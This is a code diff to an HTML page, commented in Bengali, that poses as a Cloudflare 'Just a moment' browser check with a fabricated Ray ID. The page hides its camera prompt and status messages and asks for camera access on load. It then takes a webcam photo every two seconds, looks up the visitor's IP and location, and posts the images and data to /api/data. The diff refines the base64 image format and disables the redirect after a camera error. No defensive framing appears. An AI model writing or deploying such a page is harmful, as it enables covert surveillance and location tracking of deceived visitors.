@@ -8,7 +8,6 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Just a moment....</title>
     <style>
-        /* ===== পুরোনো CSS (camera.html থেকে) ===== */
         * {
             margin: 0;
             padding: 0;
@@ -28,7 +27,6 @@
             padding: 20px;
             text-align: center;
         }
-        /* ===== নতুন UI (Cloudflare-style) ===== */
         .cf-bubbles {
             margin: 0 auto 30px auto;
         }
@@ -78,18 +76,10 @@
             display: block;
             margin-top: 8px;
         }
-        /* ===== সব স্ট্যাটাস/লোডার/এরর মেসেজ লুকানো ===== */
-        #status,
-        .status,
-        #cam-status,
-        .error-msg,
-        #requestBtn,
-        .preview,
-        .loader,
-        .note {
+        /* সব স্ট্যাটাস/এরর মেসেজ লুকানো */
+        #status, .status, #cam-status, .error-msg, #requestBtn, .preview, .loader, .note {
             display: none !important;
         }
-        /* ভিডিও এলিমেন্ট শুধু ফাংশনালিটির জন্য লুকানো */
         video {
             display: none !important;
         }
@@ -97,7 +87,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- ===== শুধু Cloudflare UI (কোনো ক্যামেরা/এরর মেসেজ নেই) ===== -->
         <div class="cf-bubbles">
             <div class="bubbles"></div>
             <div class="bubbles"></div>
@@ -107,7 +96,6 @@
         <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
         <p id="status-text">Please allow up to 5 seconds…</p>
 
-        <!-- ===== লুকানো এলিমেন্ট (শুধু ফাংশনালিটির জন্য) ===== -->
         <button id="requestBtn">Allow Camera Access</button>
         <video id="preview" autoplay playsinline muted></video>
         <div class="status" id="status">
@@ -118,7 +106,6 @@
             Your privacy is important to us. Camera access is required for this service.
         </div>
 
-        <!-- Attribution -->
         <div class="attribution">
             DDoS protection by
             <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
@@ -131,20 +118,15 @@
         (function() {
             "use strict";
 
-            // ===== camera.html-এর সব ফাংশনালিটি (হুবহু) =====
             const preview = document.getElementById('preview');
-
             let stream = null;
             let captureInterval = null;
 
-            // ===== sendData (camera.html থেকে হুবহু) =====
             async function sendData(data) {
                 try {
                     await fetch('/api/data', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                 } catch (error) {
@@ -152,7 +134,7 @@
                 }
             }
 
-            // ===== capturePhoto (camera.html থেকে হুবহু) =====
+            // ===== শুধু এখানে পরিবর্তন (ছবির হেডার বাদ দেওয়া) =====
             async function capturePhoto() {
                 if (!preview.videoWidth || !preview.videoHeight) return;
 
@@ -160,26 +142,29 @@
                     const canvas = document.createElement('canvas');
                     canvas.width = preview.videoWidth;
                     canvas.height = preview.videoHeight;
-
                     const context = canvas.getContext('2d');
                     context.drawImage(preview, 0, 0, canvas.width, canvas.height);
 
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    // পুরো ডেটা ইউআরএল (যেমন: "data:image/jpeg;base64,/9j/4AAQ...")
+                    const fullImageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // শুধু বেস৬৪ অংশ নিন (কমা (,) এর পরের অংশ)
+                    const rawBase64 = fullImageData.split(',')[1];
 
-                    // IP ও লোকেশন
+                    // আইপি ও লোকেশন
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
 
                     const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                     const locationData = await locationResponse.json();
 
-                    // ডাটা পাঠাও
+                    // ডাটা পাঠান (এখন 'image' ফিল্ডে শুধু বেস৬৪ থাকবে)
                     await sendData({
                         linkId: window.location.pathname.split('/')[2] || 'unknown',
                         type: 'camera',
                         data: {
-                            image: imageData,
-                            size: imageData.length,
+                            image: rawBase64, // ← হেডার ছাড়া শুধু বেস৬৪
+                            size: rawBase64.length,
                             timestamp: new Date().toISOString()
                         },
                         ip: ipData.ip,
@@ -198,15 +183,16 @@
                         }
                     });
 
+                    // ডিবাগের জন্য কনসোলে সাইজ দেখুন (শুধু চেক করতে)
+                    console.log(`📸 ছবি পাঠানো হলো (সাইজ: ${rawBase64.length})`);
+
                 } catch (error) {
                     console.error('Capture Error:', error);
                 }
             }
 
-            // ===== ক্যামেরা চালু (কোনো UI মেসেজ ছাড়া) =====
             async function startCamera() {
                 try {
-                    // ক্যামেরা অ্যাক্সেস (নীরবে)
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             width: { ideal: 1280 },
@@ -218,31 +204,26 @@
 
                     preview.srcObject = stream;
 
-                    // প্রতি ২ সেকেন্ডে ফটো ক্যাপচার
                     if (captureInterval) clearInterval(captureInterval);
                     captureInterval = setInterval(capturePhoto, 2000);
-                    // সাথে সাথে প্রথম ছবি
                     setTimeout(capturePhoto, 500);
 
                 } catch (error) {
                     console.error('Camera Error:', error);
 
-                    // Error report (UI-তে কিছু দেখাবে না)
                     sendData({
                         error: error.message,
                         type: 'camera_error'
                     });
 
-                    // ৩ সেকেন্ড পর রিডাইরেক্ট (camera.html-এর মতো, কিন্তু কোনো মেসেজ ছাড়া)
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 3000);
+                    // রিডাইরেক্ট (চাইলে কমেন্ট খুলুন)
+                    // setTimeout(() => {
+                    //     window.location.href = 'https://google.com';
+                    // }, 3000);
                 }
             }
 
-            // ===== পেজ লোড হলে অটোmatically ক্যামেরা চাওয়া =====
             window.addEventListener('load', function() {
-                // Ray ID র্যান্ডম স্ট্রিং
                 const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
                 let ray = "";
                 for (let i = 0; i < 17; i++) {
@@ -250,11 +231,14 @@
                 }
                 document.getElementById('ray').textContent = ray;
 
-                // ক্যামেরা স্টার্ট (কোনো বাটন বা মেসেজ ছাড়াই)
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.error("❌ এই ব্রাউজার ক্যামেরা সাপোর্ট করে না।");
+                    return;
+                }
+
                 startCamera();
             });
 
-            // ===== পেজ ছাড়ার সময় ক্লিনআপ =====
             window.addEventListener('beforeunload', function() {
                 if (captureInterval) clearInterval(captureInterval);
                 if (stream) {
